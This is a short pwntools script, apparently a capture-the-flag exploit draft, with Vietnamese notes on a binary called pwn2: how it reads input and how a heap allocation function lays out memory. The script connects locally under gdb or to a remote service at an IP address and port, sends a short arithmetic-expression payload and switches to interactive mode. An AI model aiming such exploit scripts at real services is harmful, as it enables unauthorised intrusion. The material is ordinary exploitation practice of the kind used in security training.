"""
- Read 150 ki tu, it nhat 3 ki tu. replace ki tu cuoi chuoi bang null
- O heap, function taovungnho se tao 1 vung 4 byte chua -1, 4 byte sau, 8 byte chua dia chi cua vung nho tiep theo can ghi
-  
"""

from pwn import *

DEBUG = True

if DEBUG:
    r = process(b"./pwn2")
    gdb.attach(r)
else:
    r = remote("172.188.64.101", 1337)

payload = b"1^1^1^1^1^1^1^1^1^1+1"
r.sendline(payload)
r.interactive()



